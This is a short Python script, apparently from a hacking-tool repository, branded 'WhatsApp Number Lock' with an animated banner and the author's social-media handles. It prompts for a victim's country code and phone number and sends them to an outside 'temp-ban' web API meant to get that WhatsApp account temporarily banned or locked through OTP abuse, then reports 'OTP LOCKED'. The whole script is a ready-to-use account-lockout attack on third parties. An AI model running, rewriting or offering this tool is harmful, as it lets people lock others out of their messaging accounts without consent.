import requests 
import os
import time
from rich import print

# Banner function with animated colorful text effect
def otp_lock_banner():
    os.system("cls" if os.name == "nt" else "clear")
    
    # Animated colorful text effect
    colors = ["red", "yellow", "green", "cyan", "blue", "magenta"]
    for color in colors:
        os.system("cls" if os.name == "nt" else "clear")
        print(f'''
[bold {color}][bold {colors[(colors.index(color) + 1) % len(colors)]}][bold {colors[(colors.index(color) + 2) % len(colors)]}]   888b     d888         d8888 8888888b.   .d8888b.   .d88888b.   .d8888b. 
   8888b    d8888       d88888 888   Y88b  d88PY88b  d88P" "Y88b  d88PY88b 
   88888b.d8 8888      d88P888 888    888 888    888 888     888  Y88b.      
   888Y88888P 888     d88P 888 888   d88P 888        888     888  "Y888b.   
   888 Y888P  888    d88P  888 8888888P"  888        888     888     "Y88b. 
   888  Y8P   888   d88P   888 888 T88b   888    888 888     888       "888 
   888   "    888  d8888888888 888  T88b  Y88b  d88P Y88b. .d88P   Y88bd88P 
   888        888 d88P     888 888   T88b  "Y8888P"   "Y88888P"   "Y8888P"  
                                                  @modder soulkid                       
                                                                        
                                                                        
[bold white]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[bold white][[bold red]^[bold white]] [bold green] ❲𓃚⭛ : 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 𝙉𝙐𝙈𝘽𝙀𝙍 𝙇𝙊𝘾𝙆 | \n [bold white][[bold red]^[bold white]] [bold green] 𝗜𝗚 : royal.m4rcos \n [bold white][[bold red]^[bold white]] [bold green] 𝗧𝗘𝗟𝗘 : https://t.me/royalmarcos
[bold white]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ''')
        time.sleep(0.5)
  
print('''[bold white]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[bold white][[bold red]^[bold white]] [bold green] ❲𓃚⭛ : 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 𝙉𝙐𝙈𝘽𝙀𝙍 𝙇𝙊𝘾𝙆 | \n [bold white][[bold red]^[bold white]] [bold green] 𝗜𝗚 : royal.m4rcos \n [bold white][[bold red]^[bold white]] [bold green] 𝗧𝗘𝗟𝗘 : https://t.me/royalmarcos
[bold white]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ''')

# API function
def temp_ban_api(country_code, phone_number):
    try:
        api_url = f"https://api-bruxiintk.online/api/temp-ban?apikey=bx&ddi={country_code}&numero={phone_number}"
        response = requests.get(api_url)
        response.raise_for_status()  # Raise an exception for HTTP errors
        if response.status_code == 200:
            return "\n[bold green] [94m𝑂𝑇𝑃  𝐿𝑂𝐶𝐾𝐸𝐷  𝐵𝑌\n  [bold green]𝑹𝑶𝒀𝑨𝑳 𝑴𝑨𝑹𝑪𝑶𝑺"

        else:
            return "Not done"
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"

# Main function
def main():
    otp_lock_banner()  # Display OTP Lock banner
    country_code = input("\n\033[90m[\033[91m?\033[90m]] \033[92m💀𝙀𝙉𝙏𝙀𝙍 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 𝘾𝙊𝘿𝙀 (𝙚𝙜, +𝟵𝟭) : " '\n ❲𓃚⭛ ')
    if not country_code.startswith("+"):
        country_code = "+" + country_code
    
    phone_number = input("\n\033[90m[\033[91m?\033[90m]] \033[92m💀𝙀𝙉𝙏𝙀𝙍 𝙉𝙐𝙈𝘽𝙀𝙍 : " '\n ❲𓃚⭛ ')
    phone_number = phone_number.replace(" ", "")  # Remove spaces
    
    result = temp_ban_api(country_code, phone_number)
    print(result)

if __name__ == "__main__":
    main()
